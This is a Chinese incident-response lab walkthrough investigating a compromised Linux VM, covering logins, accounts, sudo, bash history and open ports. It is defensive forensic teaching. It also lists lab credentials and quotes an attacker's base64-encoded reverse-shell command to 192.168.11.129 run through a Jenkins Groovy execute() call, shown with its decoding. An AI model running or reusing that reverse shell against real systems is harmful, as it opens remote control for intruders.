---
title: 应急响应打靶--Linux溯源
url: https://mp.weixin.qq.com/s/LpC3kUbC9mLy15kUZLvUrQ
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:00:40.992052
---

# 应急响应打靶--Linux溯源

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/qkajCoyKpkAibx2RnurVRSQ2ld8mC3KPicw2110n8F84ic2bgozJPsFvvIVXUMOztvDDvvR2gNQrdE3zIgwNqpWNCvlt6FpYYQxibjTib7icjCRCA/0?wx_fmt=jpeg)

# 应急响应打靶--Linux溯源

原创

一个努力的学渣
一个努力的学渣

一个努力的学渣

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

免责声明

本文只做学术研究使用，不可对真实未授权网站使用，如若非法他用，与平台和本文作者无关，需自行负责！

靶机资源：

网盘下载：https://pan.quark.cn/s/4b6dffd0c51a#/list/share

需要注意：应急，没有所谓的标准流程

用户名密码：zgsfsys/zgsfsys

登录进去第一眼看到了passwords.txt文件，里面是三个地址，需要先记录下

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkC8WNez1I6lrVqaufTc1mWyXqJzGiaPuNiaPiaLeHolXROW9UXPtxVPSRgOtHzdIQmBV8ZgJxuqH9x0Kab7331KGra2zpUdmKI78c/640?wx_fmt=png&from=appmsg)

```
passwords.txt：https://127.0.0.1:15493/c536062cusername: fidiyixbpassword: 0f48abfd
http://127.0.0.1:6631/username: adminpassword: BnGDPepT3P4BsxR
http://127.0.0.1:6565/username: adminpassword: admin148849464348
```

登录信息查询

假设，黑客已经入侵这台服务器了，我们第一步要做的是什么呢？

查看用户？查看日志？查看进程？直接拿脚本、工具去扫？

不，都不是

第一步，最主要的是现在都有哪些人在登录，比如黑客是否在进行其他操作，如果当时黑客正在连接服务器，先ban掉黑客的IP以及连接，在做其他操作，不然一切都是无用功

w：查看系统信息，用于显示某一时刻用户的行为

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkAo7R5iaYY8PQ3bNqYtP6mSToJkZ1y5yycxeibET6t0NcH2LqcaFicEbs8t7vDMKFPMPBrgXMWtL4fPCvu8UNsByiakpMz24nBu1ug/640?wx_fmt=png&from=appmsg)

* USER: 登录帐号

* TTY : 终端名称

* FROM: 远程主机名

* LOGIN@: 登录时间

* IDLE: 空闲时间

* JCPU: 该TTY终端连接的所有进程的占用时间

* PCPU: 当前进程(即w项中显示的)的占用时间

* WHAT: 当前正在运行进程的命令行

who：查看当前登录用户（tty本地登录  pts远程登录）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkC1k61pVXgxjFNGpBQRhFHt5j4AMian0dbkw59fOiawozJHUAOu2DwolMoXDsMXV1Q95APJ2ETiaticY3UQ1hDMia8cpK58LMic8FA80/640?wx_fmt=png&from=appmsg)

last：用于显示用户最近登录信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkA9icK6IGNELYLvPZDRrVVf43ibS1x7BLyDervYF3xYNeT1vibE7b8gPfMsOmib1o1c28jCUm8icMRVW3SxvmBBs9eUt3nk759o7btU/640?wx_fmt=png&from=appmsg)

可疑用户

查看是否有可疑账户：cat /etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkDQMqFXZcicSVrplwVZKh1ySiaLIzmQB387arcqVTHJPVLQ02KyErpicAZxR7bib5R1f62sQZkPXQp7PzHWkib1YoITbWXO94UsmHLY/640?wx_fmt=png&from=appmsg)

```
可以看出：zgsfsys：安装系统时创建的主登录用户jenkins：安装 Jenkins 服务时自动创建的用户www：存在web网站，额外创建的用户smnta：安装 Sendmail 服务时创建的邮件传输代理用户smmsp：安装 Sendmail 服务时创建的邮件提交程序用户mysql：安装 MySQL 服务时自动创建的用户
```

查询特权用户特权用户(uid 为0)：awk -F: '$3==0{print $1}' /etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkDtCU3rJQaeTpczNH4SpjHr9M94vBpco0LOLVkVHPb3OjloHBR7UWUoBeyBHhictASBs9vSwHntPdUpfWkicBypnUHJA57sibO378/640?wx_fmt=png&from=appmsg)

* 正常情况下输出内容只有root，如果存在其他用户，需要注意

查询可以远程登录的账号信息(普通账户没权限)：awk '/\$1|\$6/{print $1}' /etc/shadow

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkDaj2mndmpfOrfvylQSiaG31vLsPBmMYoWW9OF3zoal7WAOUD1uX3wPWK9SnnLNR9S2Wzh21vxwUu94YwapUoM62Hp9ibz9KV24I/640?wx_fmt=png&from=appmsg)

cat /etc/passwd|grep "/bin/bash"

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkBvic9stfMYqsicGQS2GO4CQalbIyXIDVRwJ6jMSgRUGIvUYwEdoVg7CpSUvjABJUVqibQ62he84M9F2IYtVbUPDPkUtQMI0iciafvw/640?wx_fmt=png&from=appmsg)

```
除root账号外，zgsfsys和jenkins用户都可以进行远程登录
```

查询其他账号是否存在sudo权限（如非管理需要，普通帐号应删除sudo权限）：more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkAPAmsIicspaTgNncWy2ZiaRBvqnCIXZfBoKhNB2WowIrc8XIpdMKia2pN3V6VUdFWMlTeFAgnz26Kke7XUNTpQrOb2azic0yKpuMs/640?wx_fmt=png&from=appmsg)

普通账户没权限查看

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkDZkla7rHjbh6QdUYmciapBvThW1zpJVJyBhDdMDYnFfvStVXk3tebGOcnXjEG3mialAX8FYXPDfkEYU2yeSdcCHUDz3O1AKRic8Q/640?wx_fmt=png&from=appmsg)

* admin用户组存在sudo权限
* cat /etc/group|grep admin

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkAq75cMYeQS0GwURojrlGDgSeJ0MBjLQHRthhwG9iaMlMJZK9p0qORCQNDMdJHk1gRuDAau9wlx5TmTMpgTRWOgZnStzfwIgwTA/640?wx_fmt=png&from=appmsg)

* 既然不在admin组，为什么可以sudo？
* groups zgsfsys

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkDM5Vs4kiaJxBxrEgNyqRuT6TWEEk629x7vfe1vGiaR8Xzafu0vQpg4XbHQXw74U36AnlkmwdOqaU9XCBdWy2GibOcibXWbib9bVGcg/640?wx_fmt=png&from=appmsg)

* 可以看到，zgsfsys有两个组：sudo和lpadmin组
* grep -E "^%sudo|^%admin" /etc/sudoers

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkCeKGicfQMlibBibqHzWtL7FE7yicdEia3ly6XHYHNbzibroF3Jk0muXmcBMbpRCY9QicficezqMkNA1hmibLhc1duCs0pptACjDTRuhD3Y/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkDt0BG7GmffkiapTP8anbf63lNDV4Q2QpLD35HiaA4m9BYib6NbqC2C723ep7iawb6QDyyrBxuhewficzpR4bzibva81ZgZh85DGqKvI/640?wx_fmt=png&from=appmsg)

* 所以这里拥有sudo权限很合理（当然普通用户建议不要提供sudo权限）

如果存在可疑账号，需要禁用或删除：

* usermod -L user：禁用帐号，帐号无法登录，在etc/shadow第二栏为!开头
* userdel user：删除user用户
* userdel -r user：将删除user用户，并且将/home目录下的user目录一并删除

历史命令

通过历史命令，可判断出攻击者做了哪些操作，根据这些操作进一步分析入侵者

root的历史命令：history    #这里root用户不知道密码，只能修改密码查看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkDkMYQOsYBoVmWs4LfqP4dhHZ64Sm0ofIObgUyiaTy7bXdvU1oDQQFu6bR8ojqLZyibvLMicIt5vmPhagq1NShqBWpXkicklsaZ7pQ/640?wx_fmt=png&from=appmsg)

其他用户的历史命令：打开/home各账号目录下的.bash\_history

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkCQA6gG2feibcOwicb3Q2D23ibhhIvauclWQ8738JX6FjlkXBuUg7zrEF0Rbhp3JAEnI91GSyefCYibhRzMGLbQf73D6BD2bS9BSCw/640?wx_fmt=png&from=appmsg)

```
得出以下结论：安装了jenkins、1panel、宝塔，存在docker服务，出现IP：192.168.11.129，反弹shell
println "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExLjEyOS8xMjM0IDA+JjE= | base64 --decode | bash ".execute().textjenkins命令执行语句解码之后：println "echo bash -i >& /dev/tcp/192.168.11.129/1234 0>&1 | base64 --decode | bash ".execute().text

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExLjEyOS8xMjM0IDA+JjE= | base64 --decode | bash解码之后：echo bash -i >& /dev/tcp/192.168.11.129/1234 0>&1 | base64 --decode | bash
```

如何为历史命令增加登录的IP地址、执行命令时间等信息：

需要注意：之前的历史命令执行时间，是当前修改配置并生效的时间，而不是之前实际攻击的实际

```
1）保存1万条命令sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile2）在/etc/profile的文件尾部添加如下行数配置信息：######jiagu history xianshi#########USER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`if [ "$USER_IP" = "" ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT="%F %T $USER_IP `whoami` "shopt -s histappendexport PROMPT_COMMAND="history -a"######### jiagu history xianshi ##########3）source /etc/profile让配置生效
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkBuXAlR0BZohagEQFzVibGPwFvMzWnvAcLUvg4AliaAibBJh0y3wib4jW1ydlNUJ8Xdsotiba2YnEd4GqpcEduOIsJqsK72doLulGds/640?wx_fmt=png&from=appmsg)

* 之后查看历史命令就会出现时间了

如果黑客执行了history -c，如何恢复？

![](https://mmbiz.qpic.cn/mmbiz_png/qkajCoyKpkCYGg6g7K9icadIcHNVmTE4ofMWwFZzYFDvd9uwVjmOEa2KklribUgwWszZbJF0piboJRnGibibCIEmHK7P0iaeqDcSZBJOJzacSKfk8/640?wx_fmt=png&from=appmsg)

方法：

1. 查看磁盘上永久保存的所有历史命令（直接看文件）

cat ~/.bash\_history

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkCD34he1Vy1WBiajux8trLd0xvw2Wg9pSwQ7DQo9xwHNFVyk7Xg2kUXjAve21a43tFtvzuvZgec23G158icLUibN2utMQLNialRKlE/640?wx_fmt=png&from=appmsg)

2. 把文件命令重新加载回内存（执行后 history 命令就能看见了）

history -r ~/.bash\_history

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkAvBiaWUZBo66RBcmzuiapwHBpHhJtdOcaSDdS1McyCv7B6cAnfL95micJqxkNzaJGgkrExWnONcuficKYTNrvBVvoJyZtBUMibCjJQ/640?wx_fmt=png&from=appmsg)

什么情况下，命令无法找回？

* 执行 history -c（清空内存）

* 执行 history -w（用空内存覆盖磁盘文件）

异常端口

查看有没有异常端口

netstat -anptu

查看pid所对应的进程文件路径：ls -l /proc/$PID/exe（$PID 为对应的pid 号）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkB7t0zNcnNpQHpgkqFtB0ichEKibficic8lY9icItIja8wia3hA1nnXb1pXiaKgdGqYD3SW9rZEjGeFyxmCOYkDLRCcwF6iakBwRsn7XBM/640?wx_fmt=png&from=appmsg)

* 那么这么多端口，我怎么知道这些端口对应的哪些服务呢？

+ 使用命令：sudo netstat -tulnp | grep 端口号

* 那么知道是哪个程序了，怎么知道这个程序的路径呢？

+ 使用命令：ps -ef | grep PID

这里只演示一个程序的用法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qkajCoyKpkB8ZZz5xciasJ7ia8klOKSib8f1g7QV31mxZhISFgWalibXlhKXWPew03zoHia9lGbEjdAk6ZQJtHbmdWBXMicfHB0FLVRUVBLYaRw9M/640?wx_fmt=png&from=appmsg)

那么我不可能一个一个去看，太浪费时间了，接下来使用脚本：

```
#!/bin/bash# 彻底修复版：解决TCP/UDP列数差异导致的UDP PID识别失败问题# 颜色配置GREEN="\033[0;32m"YELLOW="\033[1;33m"BLUE="\033[0;34m"RED="\033[0;31m"NC="\033[0m"clearprintf "${BLUE}==================== netstat -anptu 全量端口一览（终极修复版） ====================${NC}\n"printf "${GREEN}协议 |  端口  |  状态   |  PID  |  进程名  |        程序绝对路径${NC}\n"printf "${GREEN}----------------------------------------------------------------------${NC}\n"# 核心：用awk区分TCP/UDP列数，避免错位sudo netstat -anptu | tail -n +3 | grep -v "unix" | awk '{ ...